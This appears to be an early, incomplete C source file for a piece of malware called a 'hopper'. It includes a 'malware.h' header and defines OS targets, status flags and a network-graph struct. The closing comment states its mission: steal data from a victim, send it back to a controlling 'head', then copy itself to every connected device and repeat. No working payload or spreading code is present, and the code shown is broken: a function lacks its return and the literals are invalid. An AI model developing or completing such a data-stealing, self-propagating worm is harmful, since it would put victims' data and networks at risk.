#include "malware.h"
#include "graph.h"
#include <stdint.h>
#include <stdbool.h>



uint32_t power2(uint8_t e){
    uint32_t cached_out[] = {
        0b1,
        0b10,
        0b100,
        0b1000,
        0b10_000,
        0b100_000,
        0b1_000_000,
        0b10_000_000


    }
}

enum OS{
    WIN,
    LIN_ARCH,
    LIN_DEB
}; typedef enum OS OS;

struct status_t{
    uint32_t wrapped;
}; typedef struct status_t status_t;

void s_mode(status_t*, const uint8_t mode);
void d_mode(status_t*, const uint8_t mode);
bool g_mode(const status_t*, const uint8_t mode);


void s_mode(status_t* s, const uint8_t mode){
    s->wrapped |= power2(mode);
}

struct hopper{
    status_t  status;
    OS        os    ;
    uint32_t  device;
    graph_t   net   ;
};



/*
 * the hopper's mission is to collect data from a victim, take it back to the head, then multiply to every device that is connected to it,
 * after that it will execute its mission again
 * the hopper has multiple states, each determine his current position and is used by the algorithm itself to figure out the next move and
 * handle errors
 */


